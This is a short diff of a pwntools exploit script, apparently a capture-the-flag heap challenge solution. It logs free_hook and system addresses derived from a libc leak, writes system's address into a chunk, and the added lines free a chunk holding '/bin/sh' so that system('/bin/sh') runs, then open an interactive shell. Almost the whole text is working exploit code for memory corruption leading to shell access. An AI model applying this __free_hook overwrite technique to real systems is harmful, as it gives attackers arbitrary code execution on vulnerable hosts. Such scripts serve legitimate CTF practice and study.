@@ -101,7 +101,6 @@ system = libc_leak - 0x19abd6
 log.success(f"{hex(free_hook)=}")
 log.success(f"{hex(system)=}")
 
-
 p.recvuntil(b">") # free fifth content chunk
 p.sendline(b"2")
 p.recvuntil(b">") 
@@ -169,6 +168,13 @@ p.recvuntil(b"size of the content:")
 p.sendline(b"8")
 p.recvuntil(b"Enter the content:")
 p.sendline(p64(system))
+
+p.recvuntil(b">") # free content chunk with bin/sh in it! -> system("/bin/sh")
+p.sendline(b"2")
+p.recvuntil(b">") 
+p.sendline(b"2")
+p.recvuntil(b"remove:")
+p.sendline(b"3")
 
 p.interactive()
 
